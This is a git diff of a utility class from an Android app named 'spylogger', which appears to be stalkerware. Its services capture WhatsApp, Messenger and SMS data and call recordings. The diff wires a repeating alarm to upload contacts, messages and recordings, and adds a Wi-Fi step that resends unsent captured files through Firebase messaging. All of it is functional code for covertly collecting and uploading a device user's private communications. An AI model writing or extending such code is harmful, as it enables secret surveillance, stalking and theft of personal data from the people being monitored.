@@ -1,6 +1,7 @@
 package com.gravatasufoca.spylogger.utils;
 
 import android.Manifest;
+import android.app.PendingIntent;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.ContentUris;
@@ -23,12 +24,18 @@ import android.webkit.MimeTypeMap;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
+import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoAcao;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.receivers.Alarm;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
+import com.gravatasufoca.spylogger.services.FcmHelperService;
 import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.services.RecordService;
 import com.gravatasufoca.spylogger.services.SendContatosService;
@@ -37,8 +44,11 @@ import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SmsService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
+import com.gravatasufoca.spylogger.vos.FcmMessageVO;
 import com.j256.ormlite.dao.Dao;
 import com.utilidades.gravata.utils.Utilidades;
+
+import org.apache.commons.io.FileUtils;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -108,6 +118,7 @@ public class Utils {
     public static ScheduledFuture<?> scheduledFuture;
     public static final long MAX_SIZE = 26214400;
     public static Alarm alarm;
+    private static PendingIntent pendingIntent;
     public static FileObserver whatsObserver;
     public static FileObserver faceObserver;
     public static boolean verificado = false;
@@ -151,21 +162,7 @@ public class Utils {
     }
 
     public static void copyFile(File source, File dest) throws IOException {
-        FileInputStream fis = new FileInputStream(source);
-
-        OutputStream output = new FileOutputStream(dest);
-        // Transfer bytes from the inputfile to the outputfile
-        byte[] buffer = new byte[1024];
-        int length;
-        while ((length = fis.read(buffer)) > 0) {
-            output.write(buffer, 0, length);
-        }
-
-        // Close the streams
-        output.flush();
-        output.close();
-        fis.close();
-
+        FileUtils.copyFile(source,dest);
     }
 
     public static void createFile(File dest, String msg) throws IOException {
@@ -373,7 +370,7 @@ public class Utils {
                 return check;
             }
         });
-        if(arquivos!=null) {
+        if (arquivos != null) {
             for (File file : arquivos) {
                 long t = file.length();
                 if (t == tamanho)
@@ -407,11 +404,11 @@ public class Utils {
         File[] arquivos = dir.listFiles(new FilenameFilter() {
             @Override
             public boolean accept(File dir, String filename) {
-                return dir.length()==tamanho;
+                return dir.length() == tamanho;
             }
         });
 
-        if(arquivos!=null) {
+        if (arquivos != null) {
             for (File file : arquivos) {
                 for (String data2 : datas) {
                     if (file.getName().toLowerCase().startsWith(nome + data2)) {
@@ -579,15 +576,20 @@ public class Utils {
         return mensagem.substring(0, tamanho);
     }
 
-    public static void startAlarm(Context context, Configuracao configuracao){
+    public static void startAlarm(final Context context, Configuracao configuracao) {
 
-        if(context!=null && configuracao!=null) {
-            if(alarm!=null){
-                alarm.CancelAlarm(context);
+        if (context != null && configuracao != null) {
+            if (alarm != null) {
+                alarm.cancelAlarm(context, pendingIntent);
             }
             Utils.alarm = new Alarm();
 
-            Utils.alarm.SetAlarm(context, configuracao.getIntervalo());
+            pendingIntent=Utils.alarm.setRepeatingAlarm(context, configuracao.getIntervalo(), new TaskComplete() {
+                @Override
+                public void onFinish(Object object) {
+                    Utils.enviarTudo(context);
+                }
+            });
         }
     }
 
@@ -601,30 +603,40 @@ public class Utils {
             context.startService(new Intent(context, SmsService.class));
             context.startService(new Intent(context, RecordService.class));
         }
-        startAlarm(context,configuracao);
+        startAlarm(context, configuracao);
     }
 
-    public static void enviarTudo(Context context){
+    public static void enviarTudo(Context context) {
         try {
-            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+            RepositorioConfiguracao repositorioConfiguracao = new RepositorioConfiguracaoImpl(context);
 
-            Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
+            Configuracao configuracao = repositorioConfiguracao.getConfiguracao();
 
-            if(configuracao!=null){
-                int status= NetworkUtil.getConnectivityStatusString(context);
-                if(status!=NetworkUtil.NETWORK_STATUS_NOT_CONNECTED) {
+            if (configuracao != null) {
+                int status = NetworkUtil.getConnectivityStatusString(context);
+                if (status != NetworkUtil.NETWORK_STATUS_NOT_CONNECTED) {
                     SendContatosService sendContatosService = new SendContatosService(context, null);
                     sendContatosService.enviarContatos();
 
                     SendMensagensService sendMensagensService = new SendMensagensService(context, null);
                     sendMensagensService.enviarTopicos();
 
-                    if(configuracao.isWifi()) {
+                    if (configuracao.isWifi()) {
                         if (status == NetworkUtil.NETWORK_STATUS_WIFI) {
                             SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                             sendGravacoesService.enviarTopicos();
+
+                            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
+                            List<Mensagem> mensagens = repositorioMensagem.listarComArquivoNaoEnviado();
+
+                            FcmMessageVO fcmMessageVO = new FcmMessageVO();
+                            fcmMessageVO.setTipoAcao(TipoAcao.REENVIAR_ARQUIVOS);
+                            fcmMessageVO.setChave(FirebaseInstanceId.getInstance().getToken());
+
+                            FcmHelperService fcmHelperService = new FcmHelperService(context, fcmMessageVO);
+                            fcmHelperService.enviarArquivos(mensagens);
                         }
-                    }else{
+                    } else {
                         SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
                         sendGravacoesService.enviarTopicos();
                     }
